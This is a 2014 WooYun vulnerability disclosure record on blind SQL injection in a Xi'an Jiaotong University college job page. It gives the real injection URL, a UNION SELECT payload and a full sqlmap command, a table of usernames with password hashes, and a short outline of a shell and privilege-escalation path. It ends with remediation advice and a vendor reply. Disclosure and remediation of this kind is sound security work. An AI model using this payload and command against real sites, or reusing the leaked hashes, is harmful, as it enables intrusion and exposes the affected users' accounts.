{"id": 50604, "wybug_id": "wooyun-2014-077368", "wybug_title": "西安交通大学某学院盲注【已GetShell、并获取服务器最高权限】", "wybug_corp": "西安交通大学", "wybug_author": "Xc0d3r", "wybug_date": "2014-09-26 13:03", "wybug_open_date": "2014-11-10 13:04", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(CCERT教育网应急响应组)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["高校"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-10：\t细节向公众公开  简要描述： 西安交通大学某学院盲注导致教师、学生信息泄露通过注入点成功进入后台并GetShell进而提权获取服务器最高权限并成为内网攻击跳板 详细说明：  注入点：\nhttp://ee.xjtu.edu.cn/eecjob/showjobfind.php?id=1\n注入类型：\nGET\n注入参数：\nid\nPayload:\nid=-1901 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x717a646571,0x686d514153427570754b,0x7165696c71)#\nExp:\nroot@hack[x:\\sqlmap]# sqlmap.py -u \"http://ee.xjtu.edu.cn/eecjob/showjobfind.php?id=1\" --hex --level 2 --risk 2 --threads 6 -v 3 --is-dba\n   漏洞证明：  1、注入\n\n\n\n\n+----------------------------------+----------------------------------------+| username                         | password                               |+----------------------------------+----------------------------------------+| eecjob0                          | 8c32f65bbcac6b1b70ead660b65d6f52       || eecjobadmin                      | e6d3609a045c8f58ec65b90adbafa407       || eecjob                           | 8befa996c5a2cba4d105e82c12f844e7       || zhouzhipeng                      | 2a7e636cd7c384234d4bcacabaa7b79e       |\n2、进入后台\n\n3、GetShell通过注册含有恶意代码的用户信息配合后台数据库备份功能获取Shell\n\n5、提权\n\n6、内网信息\n\n未做进一步内网攻击测试。   修复方案：  1、对全站进行php木马查杀2、根据注入点结合相关源码配合intval、addslashes等函数过滤注入参数3、正确配置apache并限制相关函数和目录   版权声明：转载请注明来源 Xc0d3r@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-09-26 13:06 厂商回复： 已通知相关学校处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-11-14 15:36 |    \t\twooOver \t\t\t( 普通白帽子  |\t\t\t        Rank:318 漏洞数:83        | 我要控制我自己)\t\t \n  请问这个是如何提权的？    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}